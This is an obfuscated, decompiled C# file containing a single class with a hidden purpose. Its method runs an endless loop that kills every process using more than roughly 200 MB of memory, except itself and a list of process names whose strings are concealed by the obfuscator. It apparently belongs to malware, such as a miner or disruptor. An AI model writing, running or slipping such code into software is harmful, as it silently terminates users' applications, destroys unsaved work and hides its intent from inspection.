using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace qYAjLWajCJpnf;

public static class pYXILhqtEBaOVEP
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void eRYbBXdFff()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107456005)) && !process.ProcessName.Contains(getString_0(107456028)) && !process.ProcessName.Contains(getString_0(107456019)) && !process.ProcessName.Contains(getString_0(107455978)) && !process.ProcessName.Contains(getString_0(107455965)) && !process.ProcessName.Contains(getString_0(107455984)) && !process.ProcessName.Contains(getString_0(107455939)) && !process.ProcessName.Contains(getString_0(107455958)) && !process.ProcessName.Contains(getString_0(107455401)) && !process.ProcessName.Contains(getString_0(107455420)) && !process.ProcessName.Contains(getString_0(107455367)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static pYXILhqtEBaOVEP()
	{
		Strings.CreateGetStringDelegate(typeof(pYXILhqtEBaOVEP));
	}
}
